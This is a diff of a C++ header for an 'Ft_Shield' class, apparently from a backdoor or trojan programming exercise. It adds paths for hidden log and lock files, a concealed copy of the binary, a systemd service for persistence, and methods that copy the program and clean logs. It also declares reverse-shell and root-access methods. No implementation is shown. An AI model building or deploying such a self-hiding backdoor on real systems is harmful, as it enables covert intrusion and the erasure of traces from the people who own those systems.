@@ -19,6 +19,10 @@
 /*
  * Ft_Shield class:
  */
+#define DAEMON_LOG_FILE "/var/log/.matt_daemon"
+#define DAEMON_LOCK_FILE "/var/lock/.matt_daemon"
+#define COPY_ELF "/usr/local/bin/.ft_shield"
+#define INIT_FILE "/etc/systemd/system/ft_shield.service"
 
 class Ft_Shield
 {
@@ -33,6 +37,7 @@ class Ft_Shield
 
 	/*---------- Public function members -----------*/
 		void			daemonize(void);
+		void			setup(char const *me);
 
 	private:
 	/*---------- Private typedef -------------------*/
@@ -64,9 +69,11 @@ class Ft_Shield
 		void			_reverseShell(int fd);
 		void			_disconnect(int fd);
 		void			_help(int fd);
-		int				_password(int fd);
+		int				_password(int fd) const;
 		void			_elfAsRoot(int fd);
 		void			_rootLike(int fd);
+		void			_copy(char const *me) const;
+		void			_cleanLog(int fd);
 };
 
 #endif /* FT_SHIELD_HPP */
